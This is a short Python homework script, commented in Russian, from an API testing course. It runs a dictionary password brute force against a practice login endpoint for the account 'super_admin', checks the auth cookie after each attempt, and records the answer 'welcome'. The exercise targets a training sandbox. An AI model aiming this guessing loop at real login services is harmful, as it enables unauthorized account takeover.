# для решение понадобилась библиотека pandas и dep openpyxl
# я внёс все пароли в однин столбец в google sheets, использовал функцию unique, чтобы выделить уникальные пароли
# с помощью pandas отпарсил файл и все пароли внёс в переменную password_list
# пришлось добавить в неё еще "password", потому что оказалось, что нужно обязательно называть столбец при парсе
# в репозитории с домашкой лежит файл Uniq_passwords.xlsx, по которому парсил
# потом прошёлся по списку, чтобы переклепать int в string, где были только числа

import requests
import pandas as pd

df = pd.read_excel("Uniq_passwords.xlsx", sheet_name=0)
passwords_list = df["password"].tolist()
passwords_list.append("password")

for i in range(len(passwords_list)):
    if passwords_list[i] is not str:
        passwords_list[i] = str(passwords_list[i])

link = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
link_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"

for password in passwords_list:
    post_data = {"login": login, "password": password}
    response = requests.post(link, data=post_data)
    cookies = dict(response.cookies)
    response_check = requests.post(link_check, cookies=cookies)
    print(f"Проверяем пароль: {password}, ответ: {response_check.text}")
    if "NOT" not in response_check.text:
        print(f"{response_check.text} \nВаш пароль: {password}")
        break

# верный пароль "welcome"
